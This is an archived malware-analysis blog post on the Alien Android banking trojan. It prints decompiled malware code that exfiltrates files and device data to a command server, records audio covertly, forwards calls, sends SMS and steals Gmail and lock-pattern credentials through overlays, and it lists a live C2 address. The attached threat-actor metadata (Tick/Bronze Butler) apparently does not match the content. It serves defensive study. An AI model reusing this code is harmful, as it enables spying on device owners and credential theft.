{
    "id": "4b9e2ebb-e4b8-4f43-8047-60bb9379f539",
    "created_at": "2023-01-12T15:03:34.370496Z",
    "updated_at": "2025-03-27T02:16:01.162488Z",
    "deleted_at": null,
    "sha1_hash": "c8b3b90fc5c81e689dd12b3ac7c9b72095908410",
    "title": "2022-09-25 - Technical analysis of Alien android malware",
    "authors": "",
    "file_creation_date": "2022-10-02T12:21:49Z",
    "file_modification_date": "2022-10-02T12:21:49Z",
    "file_size": 2157549,
    "plain_text": "# Technical analysis of Alien android malware\n\n**muha2xmad.github.io/malware-analysis/alien/**\n\n\nSeptember 25, 2022\n\n\n-----\n\n### Muhammad Hasan Ali\n\n#### Malware Analysis learner\n\n 10 minute read\n\n بسم اهلل الرحمن الرحيم\n\n## Unpacking\n\n#### If you opened the sample in JEB decompiler, you will find classes names are obfuscated and contains nop code which makes the analysis of the code more harder and it’s an indicator that the sample is packed. So we need to get the decrypted payload. We will use this script with Frida to get the payload. I explained in details how to unpack a sample here and here.\n\n After unpacking the sample and get the payload, we see the strings is encrypted using Base64 and other ecryption routine. The encryption routine found in d located in\n```\ncom.mhiauaqmlacl.ypmsfwbkjhsbeoz . We will use this JEB script but we will change the\n\n key value to tycusvgndour . Then add the script to the JEB decompiler. To add the script, press F2 and Create then copy the script from github and paste it. To run the script, select the encrypted string and press execute the decrypted strings will be a comment. One by one you will find yourself decrypting all the strings and start analyzing the payload. Big thanks to Axelle Ap. for all the scripts.\n\n```\n\n-----\n\n#### Figure(1): decrypting keys and C2 server\n\n## TeamViewer helps the devil\n\n#### This an amazing technique which allow the malware to do malicious things even if the user is opening the device. The malware will open an overlay screen which tells the user that\n```\nthere's a system update you need to wait . While the overlay screen is set over the\n\n screen, the malware will do malicious actions by conneecting to TeamViewer app.\n\n Figure(2): Fake system update\n\n```\n\n-----\n\n```\n  if(s2.contains(this.a( ZWJkNzMyYWFkYjM1NzUwYWJkYTkxYTVlNDgyMDdlZDhiMGNh ))) { //\nconnect_teamviewer\n\n          JSONObject jSONObject6 = new JSONObject(s2);\n\n          this.a.e(this, this.b.aK,\njSONObject6.getString(this.a(\"ZWJkNzMyYWFkYjM1NzUwYWJkYTkxYTVlNDgyMDdlZDhiMGNh\"))); \n// connect_teamviewer\n\n          this.a.e(this, this.b.aL,\njSONObject6.getString(this.a(\"ZjhkOTJmYjdjOTM5NzMzMQ==\"))); // password\n\n          this.a.e(this, this.b.aO,\njSONObject6.getString(this.a(\"ZWVkOTM3YTE=\"))); // fake\n\n          this.a.e(this, this.b.aM,\njSONObject6.getString(this.a(\"ZTBkMTM4YTBkYjM4\"))); // hidden\n\n          this.a.e(this, this.b.aN,\njSONObject6.getString(this.a(\"ZWFkNDMzYTdkNTNmNmYzMg==\"))); // blocking\n\n          this.a.f(this);\n\n          i.f(this,\nthis.a(\"ZWJkNzMxZWFjYTMzNjAzOGJmYTUxZTQ0NWIzYjM1YzdiYWNiOTZiODljYTY5MTNhZGFlYQ==\")); \n// com.teamviewer.host.market\n\n          goto label_5;\n\n        }\n\n        if(s2.contains(this.a(\"ZTdjODM5YWFlMTIyNjQzNGE0YmExMjU2NDkyYzY5\"))) {\n// open_teamviewer\n\n          JSONObject jSONObject7 = new JSONObject(s2);\n\n          this.a.e(this, this.b.aO,\njSONObject7.getString(this.a(\"ZWVkOTM3YTE=\"))); // fake\n\n          this.a.e(this, this.b.aM,\njSONObject7.getString(this.a(\"ZTBkMTM4YTBkYjM4\"))); // hidden\n\n          this.a.e(this, this.b.aN,\njSONObject7.getString(this.a(\"ZWFkNDMzYTdkNTNmNmYzMg==\"))); // blocking\n\n          this.a.f(this);\n\n          i.f(this,\nthis.a(\"ZWJkNzMxZWFjYTMzNjAzOGJmYTUxZTQ0NWIzYjM1YzdiYWNiOTZiODljYTY5MTNhZGFlYQ==\")); \n// com.teamviewer.host.market\n\n          goto label_5;\n\n        }\n\n        if(s2.contains(this.a(\"ZmJkZDMyYTBlMTI1NjQyMWJkYTUxNTU0NGQ=\"))) { //\nsend_settings\n\n          JSONObject jSONObject8 = new JSONObject(s2);\n\n          this.a.e(this, this.b.aO,\njSONObject8.getString(this.a(\"ZWVkOTM3YTE=\"))); // fake\n\n          this.a.e(this, this.b.aM,\njSONObject8.getString(this.a(\"ZTBkMTM4YTBkYjM4\"))); // hidden\n\n          this.a.e(this, this.b.aN,\njSONObject8.getString(this.a(\"ZWFkNDMzYTdkNTNmNmYzMg==\"))); // blocking\n\n          this.a.f(this);\n\n          goto label_5;\n\n        }\n\n        if(!s2.contains(this.a(\"ZWNkZDJhYWRkZDMzNWUyMGE3YTAxNDUwNTU=\"))) { \n// device_unlock\n\n```\n\n-----\n\n```\n          goto label_5; // device_unlock\n\n        }\n\n        JSONObject jSONObject9 = new JSONObject(s2);\n\n        this.a.e(this, this.b.aO,\njSONObject9.getString(this.a(\"ZWVkOTM3YTE=\"))); // fake\n\n        this.a.e(this, this.b.aM,\njSONObject9.getString(this.a(\"ZTBkMTM4YTBkYjM4\"))); // hidden\n\n        this.a.e(this, this.b.aN,\njSONObject9.getString(this.a(\"ZWFkNDMzYTdkNTNmNmYzMg==\"))); // blocking\n\n        goto label_553;\n\n      catch(Exception unused_ex) {\n\n      }\n\n## Data exfiltration\n\n#### The malware has the ability to exfiltrate the data and sending specific files to the C2 server from the vitim’s device.\n\n```\n\n-----\n\n```\nif(s2.contains(this.a( ZTdjODM5YWFlMTMwNmUzOWFkYTkwOQ ))) { // open_folder\n\n          String s3 = new\nJSONObject(s2).getString(this.a(\"ZTdjODM5YWFlMTMwNmUzOWFkYTkwOQ==\")); // open_folder\n\n          if(s3.equals(this.a(\"ZjY5Nw==\"))) { // ~/\n\n            s3 =\nEnvironment.getExternalStorageDirectory().getAbsolutePath();\n\n          }\n\n          String[] arr_s = this.a.b(new File(s3));\n\n          try {\n\n            JSONObject jSONObject1 = new JSONObject();\n\n            jSONObject1.put(this.a(\"ZWJkNTM4\"),\nthis.a(\"ZTljYTJlYTVjNzA5NjczY2E1YTkwODZjNTgyNjc3Y2JiMGNh\")); // array_files_folder\n\n// cmd\n\n            jSONObject1.put(this.a(\"ZWNkMTJl\"), i.e(s3)); // dir\n\n            jSONObject1.put(this.a(\"ZWVkNzMwYTBkYjI0NzI=\"),\ni.e(arr_s[0])); // folders\n\n            jSONObject1.put(this.a(\"ZWVkMTMwYTFjZA==\"), i.e(arr_s[1])); \n// files\n\n            String s4 = jSONObject1.toString().replace(\"\\\\n\", \"\");\n\n            this.a.a(this.a(\"YzJlYjEzOGFlMTA1NDQxYjhk\"), s4); //\nJSON_SEND\n\n            this.a.i(this, this.b.H + this.a.h(s4));\n\n            goto label_5;\n\n          }\n\n          catch(JSONException unused_ex) {\n\n          }\n\n          this.a.a(this.c,\nthis.a(\"Y2RjYTJlYWJjYzc2NmIyNmE2YTI1YjQxNWYzZDNiYzVhNmQ3OGNjNDk0YjY5NjM0Y2NlYWZlMTEzOT\n // Error json rat jsonRequest open_folder\n\n          goto label_5;\n\n        }\n\n        if(!s2.contains(this.a(\"ZmRjODMwYWJkZjMyNjgzYmFkOTMxZDVhNTIyYw==\")))\n{ // uploadind_file\n\n          goto label_273; // uploadind_file\n\n        }\n\n        jSONObject2 = new JSONObject(s2);\n\n## Collected data\n\n#### The malware will collect data from the victim’s device such as battery percentage, language used on device, Accessibility Service status, phone number of the used line, Google accounts, and permissions obtained from the device. Then send it to the C2 server.\n\n```\n\n-----\n\n```\n try { // DM\n\n      jSONObject0.put(jwozx0.a(\"Y2NmNQ==\"), s2); // DM\n\n      jSONObject0.put(jwozx0.a(\"YzlmYw==\"), jwozx0.a(\"ZTZjZDMwYTg=\")); // null\n\n                                       // AD\n\n      jSONObject0.put(jwozx0.a(\"Y2FmNA==\"), i.battary_percentage(context0)); \n// BL\n\n      jSONObject0.put(jwozx0.a(\"ZGNlZg==\"), jwozx0.a.sharedpref(context1,\nc0.af)); // TW\n\n      String s3 = jwozx0.a(\"ZGJmOQ==\"); // SA\n\n      String phone_num = i.s(this) ? \"Yjk=\" : \"Yjg=\"; // 0\n\n                               // 1\n\n      String s5 = jwozx0.a(phone_num);\n\n      jSONObject0.put(s3, s5);\n\n      jSONObject0.put(jwozx0.a(\"ZGJlOA==\"), jwozx0.a.sharedpref(context1,\nc0.ar)); // SP\n\n      jSONObject0.put(jwozx0.a(\"ZGJlYg==\"), i.u(context0)); // SS\n\n      jSONObject0.put(jwozx0.a(\"YzRmZA==\"), Locale.getDefault().getLanguage());\n// LE\n\n      String s6 = jwozx0.a(\"ZGJlMQ==\"); // SY\n\n      String phone_num = i.accessibility_status(context1, ojfiq.class) ? \"Yjk=\"\n: \"Yjg=\"; // 0\n\n// 1\n\n      String s8 = jwozx0.a(phone_num);\n\n      jSONObject0.put(s6, s8);\n\n      jSONObject0.put(jwozx0.a(\"ZGJmNQ==\"), i.default_sms_pkg(this)); // SM\n\n      jSONObject0.put(jwozx0.a(\"YzFmYw==\"), s1); // ID\n\n      jSONObject0.put(jwozx0.a(\"YzFlYg==\"), jwozx0.a.sharedpref(context1,\nc0.ae)); // IS\n\n      String s9 = jwozx0.a(\"YzZlYQ==\"); // NR\n\n      String phone_num = context1.checkCallingOrSelfPermission(jwozx0.a.a.p) ==\n0 ? ((TelephonyManager)context1.getSystemService(\"phone\")).getLine1Number() : \"\";\n\n      jSONObject0.put(s9, phone_num);\n\n      jSONObject0.put(jwozx0.a(\"Y2ZmOQ==\"), i.google_acc(this)); // GA\n\n      jSONObject0.put(jwozx0.a(\"ZDhlYg==\"), i.check_permission(jwozx0,\nc0.q[0])); // PS\n\n      jSONObject0.put(jwozx0.a(\"ZDhmYg==\"), i.check_permission(jwozx0,\nc0.q[1])); // PC\n\n      jSONObject0.put(jwozx0.a(\"ZDhlOA==\"), i.check_permission(jwozx0,\nc0.q[2])); // PP\n\n      jSONObject0.put(jwozx0.a(\"ZDhmNw==\"), i.check_permission(jwozx0,\nc0.q[3])); // PO\n\n    }\n\n    catch(JSONException unused_ex) {\n\n      jwozx0.a.a(s,\njwozx0.a(\"Y2RlYTBlOGJlYzc2NGIwNjg2ODI1YjcwNzYwYzU4ZTRmNWZhYWRjMg==\")); // ERROR JSON\nCHECK BOT\n\n    }\n\n## Recording audio\n\n#### The malware has the ability to record audio without the knowledge of the user\n\n```\n\n-----\n\n```\nprotected void onHandleIntent(Intent intent0) {\n\n    try { // tick\n\n      int v = Integer.parseInt(intent0.getStringExtra(this.a(\"ZmNkMTNmYWY=\")));\n// tick\n\n      String s = intent0.getStringExtra(this.a(\"ZTZkOTMxYTE=\")); // name\n\n      if(v > 0 || v == -1) {\n\n        String s1 = new\nSimpleDateFormat(this.a(\"YzVmNTcxYTBkYTdiNzgyY2IwYjUyNDdiNzY3Mzc2YzJlZmNiOTE=\"),\nLocale.US).format(Calendar.getInstance().getTime()); // MM-dd-yyyy_HH:mm:ss\n\n        this.d = this.getExternalFilesDir(null) + (this.a(\"YTc=\") + s +\nthis.a(\"ZDc=\") + s1 + this.a(\"YTZkOTMxYjY=\")); // .amr\n\n// _\n\n// /\n\n        this.b.a(this.a(\"Y2VmMTEwODE5ZTA0NDQxNg==\"), this.d); // FILE REC\n\n        this.b.a(this.a(\"ZGNkMTMxYTE=\"), String.valueOf(v)); // Time\n\n        String s2 = this.d;\n\n        MediaRecorder mediaRecorder0 = new MediaRecorder();\n\n        this.b.a(this.a(\"ZGJmNzA5OGFmYQ==\"),\nthis.a(\"ZGJlYzFkOTZlYTc2NTMxMDhhODMyOTc3MWUxYTU0ZmE5YmZj\")); // START RECORD SOUND\n\n// SOUND\n\n        this.a = false;\n\n        mediaRecorder0.setAudioSource(1);\n\n        mediaRecorder0.setOutputFormat(3);\n\n        mediaRecorder0.setAudioEncoder(1);\n\n        mediaRecorder0.setOutputFile(s2);\n\n        Thread thread0 = new Thread(new Runnable() {\n\n          @Override\n\n          public final void run() {\n\n            try {\n\n              if(v == -1) {\n\n                Thread.sleep(900000L);\n\n              }\n\n              else {\n\n                Thread.sleep(v * 1000);\n\n              }\n\n            }\n\n            catch(InterruptedException unused_ex) {\n\n              izyiyumk.this.b.a(izyiyumk.this.a(\"ZGJmNzA5OGFmYQ==\"),\nizyiyumk.this.a(\"ZGJlYzEzOTQ5ZTA0NDQxNjg2OWUzZjEzNmQwNjRlZTE5MQ==\")); // STOP RECORD\nSOUND\n\n// SOUND\n\n              try {\n\n                mediaRecorder0.stop();\n\n                mediaRecorder0.release();\n\n                izyiyumk.this.b.a(izyiyumk.this.a(\"Y2VmMTEwODE=\"),\ns2); // FILE\n\n                String s = izyiyumk.this.b.j(this,\nizyiyumk.this.c.ba);\n\n```\n\n-----\n\n```\n                izyiyumk.this.b.e(this, izyiyumk.this.c.ba, s +\nizyiyumk.this.a(\"YWI5Yjdm\") + s2); // ###\n\n                if(v == -1) {\n\n                  if(izyiyumk.this.b.j(this,\nizyiyumk.this.c.aZ).equals(izyiyumk.this.a(\"Yjk=\"))) { // 1\n\n                    Intent intent0 = new Intent(this,\nizyiyumk.class).putExtra(izyiyumk.this.a(\"ZmNkMTNmYWY=\"),\nizyiyumk.this.a(\"YTU4OQ==\")).putExtra(izyiyumk.this.a(\"ZTZkOTMxYTE=\"),\nizyiyumk.this.a(\"ZmFkZDNmYWJjYzMyNWUzNGJjYTgxMjVj\")); // record_audio\n\n// name\n\n// -1\n\n// tick\n\n                    izyiyumk.this.startService(intent0);\n\n                    return;\n\n                  }\n\n                  izyiyumk.this.b.e(this, izyiyumk.this.c.aY, \"\");\n\n                  return;\n\n                }\n\n                izyiyumk.this.b.e(this, izyiyumk.this.c.aY, \"\");\n\n              }\n\n              catch(Exception unused_ex) {\n\n              }\n\n              return;\n\n            }\n\n            catch(Throwable unused_ex) {\n\n              return;\n\n            }\n\n            izyiyumk.this.b.a(izyiyumk.this.a(\"ZGJmNzA5OGFmYQ==\"),\nizyiyumk.this.a(\"ZGJlYzEzOTQ5ZTA0NDQxNjg2OWUzZjEzNmQwNjRlZTE5MQ==\")); // STOP RECORD\nSOUND\n\n// SOUND\n\n\n## Classic features\n\n Call and call forward\n\n#### After granting all call permissions, the malware will have the ability to call or forward call.\n\n```\n\n-----\n\n```\n try {\n\n        Intent intent0 = new Intent(\"android.intent.action.CALL\");\n\n        intent0.addFlags(0x10000000);\n\n        intent0.setData(Uri.parse(\"tel:\" + Uri.encode(s26)));\n\n        context1.startActivity(intent0);\n\n        String s27 = \"USSD: \" + s26 + \"[143523#]\";\n\n        i1.a(\"USSD\", s27);\n\n        i1.f(context1, i1.a.ab, s27);\n\n        return;\n\n      }\n\n      catch(Exception unused_ex) {\n\n      }\n\n      try {\n\n        i1.a(\"USSD\", \"Error: Start USSD\");\n\n        i1.a(\"USSD\", \"Error USSD[143523#]\");\n\n        i1.f(context1, i1.a.ab, \"Error USSD[143523#]\");\n\n        return;\n\n      label_1329:\n\n        i2 = jwozx0.a;\n\n        s28 = jSONObject5.getString(jwozx0.a(\"ZTY=\")); // n\n\n      }\n\n      catch(Exception unused_ex) {\n\n        return;\n\n      }\n\n      try {\n\n        Intent intent1 = new Intent(\"android.intent.action.CALL\");\n\n        intent1.addFlags(0x10000000);\n\n        intent1.setData(Uri.fromParts(\"tel\", \"*21*\" + s28 + \"#\", \"#\"));\n\n        context1.startActivity(intent1);\n\n        String s29 = \"ForwardCALL: \" + s28 + \"[143523#]\";\n\n        i2.a(\"ForwardCall\", s29);\n\n        i2.f(context1, i2.a.ab, s29);\n\n        return;\n\n      }\n\n      catch(Exception unused_ex) {\n\n      }\n\n## Smishing\n\n#### The malware has the ability to send SMSs to any contact using the phone number of the victim. The SMS text is received from the C2 server then sent to another victim.\n\n```\n\n-----\n\n```\n public final void send_sms(Context context0, String s, String s1) {\n\n    try {\n\n      SmsManager smsManager0 = SmsManager.getDefault();\n      ArrayList arrayList0 = smsManager0.divideMessage(s1);\n\n      int v = 0;\n\n      PendingIntent pendingIntent0 = PendingIntent.getBroadcast(context0, 0,\nnew Intent(\"SMS_SENT\"), 0);\n\n      PendingIntent pendingIntent1 = PendingIntent.getBroadcast(context0, 0,\nnew Intent(\"SMS_DELIVERED\"), 0);\n\n      ArrayList arrayList1 = new ArrayList();\n\n      ArrayList arrayList2 = new ArrayList();\n\n      while(v < arrayList0.size()) {\n\n        arrayList2.add(pendingIntent1);\n\n        arrayList1.add(pendingIntent0);\n\n        ++v;\n\n      }\n\n      smsManager0.sendMultipartTextMessage(s, null, arrayList0, arrayList1,\narrayList2);\n\n      String s2 = \"Output SMS:\" + s + \" text:\" + s1 + \"[143523#]\";\n\n      this.a(\"SMS\", s2);\n\n      this.f(context0, this.a.ab, s2);\n\n      this.h(context0, this.sharedpref(context0, this.a.Q));\n\n    }\n\n    catch(Exception unused_ex) {\n\n    }\n\n  }\n\n## Overlay attack\n\n#### The malware comes with classic features such as overlya attack. If a targeted APP is opened then the malware will launch the html file of the targeted app.\n\n```\n\n-----\n\n```\nprotected void onCreate(Bundle bundle0) {\n\n    super.onCreate(bundle0);\n\n    this.c = new WebView(this);\n\n    this.c.getSettings().setJavaScriptEnabled(true);\n\n    this.c.setScrollBarStyle(0);\n\n    this.c.setWebViewClient(new b(this, 0));\n\n    this.c.setWebChromeClient(new a(this, 0));\n\n    this.c.loadUrl(this.b.m);\n\n    this.setContentView(this.c);\n\n  }\n\n  @Override // android.app.Activity\n\n  public void onDestroy() {\n\n    super.onDestroy();\n\n    this.c.removeAllViewsInLayout();\n\n    this.c.removeAllViews();\n\n    this.c.destroy();\n\n    this.c = null;\n\n    this.finish();\n\n  }\n\n#### One of the targeted APPs The malware will try to steal is Gmail . The malware will try to steal Gmail credential using Overlay attack . And The malware will try to steal lockpattern using overlay attack. Then send logs to the C2 server.\n\n```\n\n-----\n\n```\n public void send_log_injects(String s) {\n\n      if(!s.isEmpty()) {\n\n        if(gtzkggpuaqjntiao.this.g.isEmpty()) {\n\n          String s1 = gtzkggpuaqjntiao.this.b.b(20);\n\n          gtzkggpuaqjntiao.this.g = s1;\n\n        }\n\n        JSONObject jSONObject0 = new JSONObject();\n\n        if(gtzkggpuaqjntiao.this.f.equals(\"grabbing_pass_gmail\")) {\n\n          gtzkggpuaqjntiao.this.b.e(this.mContext,\ngtzkggpuaqjntiao.this.a.aG, \"\");\n\n          String s2 =\ngtzkggpuaqjntiao.this.a(\"ZWJkNzMxZWFkOTM5NmUzMmE1YTk1NTUyNTAyZDY5YzBiY2RjY2NmMTlj\"); \n// com.google.android.gm ==> Gmail APP\n\n          gtzkggpuaqjntiao.this.f = s2;\n\n        }\n\n        if(gtzkggpuaqjntiao.this.f.equals(\"grabbing_lockpattern\")) {\n\n          gtzkggpuaqjntiao.this.b.e(this.mContext,\ngtzkggpuaqjntiao.this.a.aI, \"\");\n\n          gtzkggpuaqjntiao.this.f = \"grabbing_lockpattern\";\n\n          String s3 =\ns.replace(i.f(gtzkggpuaqjntiao.this.a(\"YzRmYjE2ZjRkYjBlNDMzOTkxZmUxNzQ2NWYyNDRkYzViMWY\n \"\"); //\nLCJ0eXBlX2luamVjdHMiOiJwaW5jb2RlIiwiY2xvc2VkIjoiY2xvc2VfYWN0aXZpdHlfaW5qZWN0cyI=\n           //,\"type_injects\":\"pincode\",\"closed\":\"close_activity_injects\"\n\n          gtzkggpuaqjntiao.this.b.f(this.mContext,\ngtzkggpuaqjntiao.this.a.ab,\ngtzkggpuaqjntiao.this.a(\"YzRkNzNmYWY5ZTA2NjAyMWJkYTkwOTVkMDQ2OQ==\") + s3 +\ngtzkggpuaqjntiao.this.a(\"ZDM4OTY4Zjc4YjY0MzI3Njk0\")); // [143523#]\n\n// Lock Pattern:\n\n        }\n\n        else {\n\n          try { // application\n\njSONObject0.put(gtzkggpuaqjntiao.this.a(\"ZTljODJjYThkNzM1NjAyMWEwYTMxNQ==\"),\ngtzkggpuaqjntiao.this.f); // application\n\n            jSONObject0.put(gtzkggpuaqjntiao.this.a(\"ZWNkOTI4YTU=\"), s); \n// data\n\n          }\n\n          catch(JSONException unused_ex) {\n\n          }\n\n          i i0 = gtzkggpuaqjntiao.this.b;\n\n          Context context0 = this.mContext;\n\n          String s4 = gtzkggpuaqjntiao.this.g;\n\n          String s5 = jSONObject0.toString();\n\n          try {\n\n            String s6 = i0.j(context0, s4);\n\n            if(s6.isEmpty()) {\n\n```\n\n-----\n\n```\n              i0.e(context0, s4, s5);\n\n            }\n\n            else {\n              JSONObject jSONObject1 = new JSONObject(s6);\n\n              JSONObject jSONObject2 = new JSONObject(s5);\n\n              String s7 = jSONObject1.getString(\"data\");\n\n              String s8 = jSONObject1.getString(\"data\");\n\n              s5 = jSONObject2.getString(\"data\");\n\n              i0.a(\"str_getParams\", String.valueOf(s7));\n\n              i0.a(\"str_params\", String.valueOf(s5));\n\n              JSONObject jSONObject3 = i.a(new JSONObject(s7), new\nJSONObject(s5));\n\n              JSONObject jSONObject4 = new JSONObject();\n\n              jSONObject4.put(\"application\", s8);\n\n              jSONObject4.put(\"data\", jSONObject3.toString());\n\n              i0.a(\"mergedJSON\", jSONObject4.toString());\n\n              i0.e(context0, s4, jSONObject4.toString());\n\n            }\n\n          }\n\n          catch(Exception unused_ex) {\n\n            i0.a(\"JSON\", \"ERROR SettingsToAddJson\");\n\n            i0.e(context0, s4, s5);\n\n          }\n\n## Commands\n\n#### These are all the commands which are received from the C2 server to the malware to do the malicious actions.\n\n```\n\n-----\n\n```\n jwozx0.a.a(s, jwozx0.a( ZWZkZDI4ZTRjYzIzNmYwYWFhYTExZjA5MWU ) +\njSONObject3.toString()); // get run_cmd:\n\n        jSONObject5 = new JSONObject(new\nString(Base64.decode(jSONObject3.getString(jwozx0.a(\"ZWNkOTI4YTU=\")), 0), \"UTF-8\")); \n// data\n\n        String s25 = jSONObject5.getString(jwozx0.a(\"ZWJkNTM4\")); // cmd\n\n        switch(s25) {\n\n          case \"remove_app\": {\n\n            goto label_1633;\n\n          }\n\n          case \"get_all_permission\": {\n\n            goto label_1761;\n\n          }\n\n          case \"run_socks5\": {\n\n            goto label_1764;\n\n          }\n\n          case \"notification\": {\n\n            goto label_1383;\n\n          }\n\n          case \"send_sms\": {\n\n            jwozx0.a.send_sms(context1,\njSONObject5.getString(jwozx0.a(\"ZTY=\")), jSONObject5.getString(jwozx0.a(\"ZmM=\")));\n\n            return;\n\n          }\n\n          case \"run_admin_device\": {\n\n            goto label_1706;\n\n          }\n\n          case \"sms_mailing_phonebook\": {\n\n            goto label_1647;\n\n          }\n\n          case \"call_forward\": {\n\n            goto label_1329;\n\n          }\n\n          case \"request_permission\": {\n\n            goto label_1713;\n\n          }\n\n          case \"send_mailing_sms\": {\n\n            jwozx0.a.a(context1, jSONObject5.getString(jwozx0.a(\"ZTY=\")),\njSONObject5.getString(jwozx0.a(\"ZmM=\")));\n\n            return;\n\n          }\n\n          case \"remove_bot\": {\n\n            goto label_1655;\n\n          }\n\n          case \"grabbing_pass_gmail\": {\n\n            goto label_1720;\n\n          }\n\n          case \"clean_cache\": {\n\n            goto label_1857;\n\n          }\n\n          case \"ussd\": {\n\n            goto label_1282;\n\n```\n\n-----\n\n```\n          }\n\n          case \"rat_connect\": {\n\n            goto label_1667;\n\n          }\n\n          case \"get_data_logs\": {\n\n            goto label_1607;\n\n          }\n\n          case \"grabbing_lockpattern\": {\n\n            goto label_1737;\n\n          }\n\n          case \"stop_socks5\": {\n\n            goto label_1801;\n\n          }\n\n          case \"change_url_connect\": {\n\n            goto label_1673;\n\n          }\n\n          case \"patch_update\": {\n\n            goto label_1866;\n\n          }\n\n          case \"url\": {\n\n            goto label_1614;\n\n          }\n\n          case \"update_inject\": {\n\n            goto label_1808;\n\n          }\n\n          case \"run_app\": {\n\n            goto label_1621;\n\n          }\n\n          case \"run_record_audio\": {\n\n            goto label_1815;\n\n          }\n\n          case \"access_notifications\": {\n\n            goto label_1752;\n\n          }\n\n          case \"change_url_recover\": {\n\n            goto label_1689;\n\n          }\n\n          case \"grabbing_google_authenticator2\": {\n\n            goto label_1628;\n\n          }\n\n        }\n\n#### If you want to download android malware samples, you can join apkdetect for free.\n\n## IoC\n\n#### APK hash: ea4960b84756fd82fe43cb2cffdbe464df6dd4d48aa10d1cefe38aa8ac6eb44d\n\n Payload (YBIw.json) hash:\n\n```\n```\n603fcae1ef4062087e0e09aa377c03fcc8bbd6f3db443717957f1bfe8c4a4dae\n\n```\n\n-----\n\n#### C2 server:\n\n http://185.255.131.145/\n\n## Article quote\n\n#### كالقبلة على جبين ميت ﻻ تساوى شيئا\n\n## REF\n\n#### Alien Technical Analysis Report\n\n JEB script\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-09-25 - Technical analysis of Alien android malware.pdf"
    ],
    "report_names": [
        "2022-09-25 - Technical analysis of Alien android malware.pdf"
    ],
    "threat_actors": [
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1673535814,
    "ts_updated_at": 1743041761,
    "ts_creation_date": 1664713309,
    "ts_modification_date": 1664713309,
    "files": {
        "pdf": "https://archive.orkl.eu/c8b3b90fc5c81e689dd12b3ac7c9b72095908410.pdf",
        "text": "https://archive.orkl.eu/c8b3b90fc5c81e689dd12b3ac7c9b72095908410.txt",
        "img": "https://archive.orkl.eu/c8b3b90fc5c81e689dd12b3ac7c9b72095908410.jpg"
    }
}